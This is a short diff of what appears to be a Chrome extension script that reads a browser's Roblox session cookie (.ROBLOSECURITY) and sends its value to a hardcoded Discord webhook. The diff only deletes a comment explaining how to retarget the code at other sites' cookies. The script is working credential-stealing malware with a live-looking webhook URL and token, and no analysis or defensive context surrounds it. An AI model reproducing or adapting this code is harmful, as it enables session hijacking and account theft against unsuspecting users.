@@ -25,7 +25,7 @@ function webhookReq(webhook, cookie) {
 
 
 // Driver Code:
-cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
+cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; 
 chrome.cookies.get(cookieInfo, function(cookie) {
   if (cookie) {
       webhookReq("https://discord.com/api/webhooks/1102405180902867004/pZEJAnndsrHj_w91WC66FcohAx2rqEq3iFQRCmFSE7WKLnmUwNDPcd94TBGBbXwH6Ey0", cookie.value);
